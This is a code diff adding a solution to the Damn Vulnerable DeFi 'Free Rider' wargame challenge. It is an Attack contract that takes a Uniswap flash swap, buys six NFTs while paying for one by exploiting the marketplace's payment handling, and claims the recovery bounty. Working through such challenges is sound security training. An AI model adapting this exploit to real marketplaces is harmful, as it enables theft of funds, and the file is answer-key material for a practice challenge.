@@ -11,6 +11,71 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Attack is IERC721Receiver {
+    DamnValuableNFT nft;
+    FreeRiderNFTMarketplace marketplace;
+    address recoveryManager;
+    IUniswapV2Pair pair;
+    WETH weth;
+    address player;
+
+    constructor(
+        DamnValuableNFT _nft,
+        FreeRiderNFTMarketplace _marketplace,
+        address _recoveryManager,
+        WETH _weth,
+        IUniswapV2Pair _pair,
+        address _player
+    ) {
+        nft = _nft;
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        weth = _weth;
+        pair = _pair;
+        player = _player;
+    }
+
+    function attack() external payable {
+        // get the flashloan
+        address token0 = pair.token0();
+        address token1 = pair.token1();
+
+        uint256 amount0Out = (token0 == address(weth) ? 15 ether : 0);
+        uint256 amount1Out = (token1 == address(weth) ? 15 ether : 0);
+
+        pair.swap(amount0Out, amount1Out, address(this), bytes(abi.encodePacked(token0, token1)));
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0Out, uint256 amount1Out, bytes calldata data) external {
+        //buy the nft tokens and get the bounty and refund the flashloan accordingly
+        weth.withdraw(15 ether);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint8 i = 0; i < 6; ++i) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+
+        // return the flashloan()
+        uint256 pay = 15 ether * 1004 / 1000;
+        weth.deposit{value: pay}();
+        weth.transfer(address(pair), pay);
+
+        // send the nfts to recovery manager;
+        for (uint8 i = 0; i < 6; ++i) {
+            nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(address(player)));
+        }
+    }
+
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +188,9 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        // uniswapPair.swap()
+        Attack att = new Attack(nft, marketplace, address(recoveryManager), weth, uniswapPair, player);
+        att.attack{value: 0.05 ether}();
     }
 
     /**
